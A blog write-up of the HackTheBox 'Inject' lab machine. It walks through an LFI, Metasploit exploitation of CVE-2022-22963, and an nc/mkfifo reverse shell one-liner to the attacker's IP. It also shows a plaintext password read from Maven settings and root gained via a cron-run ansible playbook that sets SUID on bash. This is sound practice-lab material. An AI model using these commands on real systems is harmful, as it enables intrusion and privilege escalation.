---
layout: single
title: Inject hackthebox writeup
excerpt: "Easy linux machine in which we exploit a CVE found plaintext credentials adn privesc with ansible"
date: 2023-04-07
classes: wide
header:
  teaser: /assets/images/inject/inject_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - cron
  - ansible
  - LFI
  - RCE
---

![](/assets/images/inject/inject.png)

## User Flag

```shell
$ nmap -sS -n -Pn -p- -vv -min-rate 5000 -oN allports 10.10.11.204
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

A webpage is exposed on port 8080, it lets us upload images and see them afterward. It may seem the foothold is to inject some malicious image however is simpler than that. The GET parameter img is vulnerable to LFI. You can even see the folders with this LFI so it is as if you were in a terminal with `ls` and `cd`.

By looking around the webpage file I found `pom.xml` which contained information about dependencies.

```shell
GET /show_image?img=../../../pom.xml
```

```xml
		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
```

In this type of scenario, the best thing to do is look for a CVE. In this case, this version of spring cloud is vulnerable to RCE.

In my case, I'm using metasploit to create another reverse shell (I don't like metasploit shell)

```shell
$ msfconsole -q
msf6 > search CVE-2022-22963

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/spring_cloud_function_spel_injection  2022-03-29       excellent  Yes    Spring Cloud Function SpEL Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/spring_cloud_function_spel_injection

msf6 > use 0
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/spring_cloud_function_spel_injection) > set LHOST tun0
LHOST => 10.10.14.16
msf6 exploit(multi/http/spring_cloud_function_spel_injection) > set RHOSTS 10.10.11.204
RHOSTS => 10.10.11.204
msf6 exploit(multi/http/spring_cloud_function_spel_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Sending stage (3045348 bytes) to 10.10.11.204
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.11.204:41376) at 2023-04-07 10:05:10 +0200
meterpreter > shell
Process 14921 created.
Channel 1 created.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 7777 >/tmp/f
rm: cannot remove '/tmp/f': No such file or directory
^Z
Background channel 1? [y/N]  y
```

Now on the other terminal, I do the usual tty improvement
```shell
[dasor@archlinux ~]$ nc -lvp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.204 34676
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
frank@inject:/$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777
                              script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ export TERM=xterm
frank@inject:/$ stty rows 30 columns 132
frank@inject:/$
```

Perfect now I have a comfortable workspace to continue.

The user we are logged in as doesn't have the user flag however, there is one more user called Phil.

```shell
frank@inject:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

And after some time searching for a way to privesc, I found Phil's credentials in Frank's home directory

```shell
frank@inject:~$ ls -la
total 32
drwxr-xr-x 6 frank frank 4096 Apr  7 07:33 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
drwxr-xr-x 3 frank frank 4096 Apr  7 07:33 .ansible
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
frank@inject:~$ cd .m2/
frank@inject:~/.m2$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

## Root flag

Now, this part is pretty straightforward. When looking through the file system earlier I found ansible directories. To see if any ansible playbook was getting executed I used pspy.

```shell
phil@inject:/dev/shm$ wget 10.10.14.16:8000/pspy64
--2023-04-07 08:16:02--  http://10.10.14.16:8000/pspy64
Connecting to 10.10.14.16:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                           100%[==========================================================>]   2.94M  1.17MB/s    in 2.5s

2023-04-07 08:16:05 (1.17 MB/s) - ‘pspy64’ saved [3078592/3078592]
phil@inject:/dev/shm$ chmod a+x pspy64
phil@inject:/dev/shm$ ./pspy64
```

```shell
2023/04/07 08:38:01 CMD: UID=0    PID=67688  | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
...
2023/04/07 08:38:01 CMD: UID=0    PID=67689  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

As seen here a cron job is deleting everything in the /opt/automation/tasks and then running (as root) everything with the yml extension on that directory. So if we manage to get root to execute a malicious ansible playbook we can privesc. That can easily be done with a bash script like this.

```shell
#!/bin/bash
while true
do
        cp /dev/shm/test.yml /opt/automation/tasks/
done
```
with `test.yml` being

```yaml
- hosts: localhost
  tasks:
  - name: privesc
    ansible.builtin.shell: chmod u+s /bin/bash
```

Once executed for a while

```shell
phil@inject:/dev/shm$ ./exp.sh
^C
phil@inject:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
phil@inject:/dev/shm$ bash -p
bash-5.0# whoami
root
```
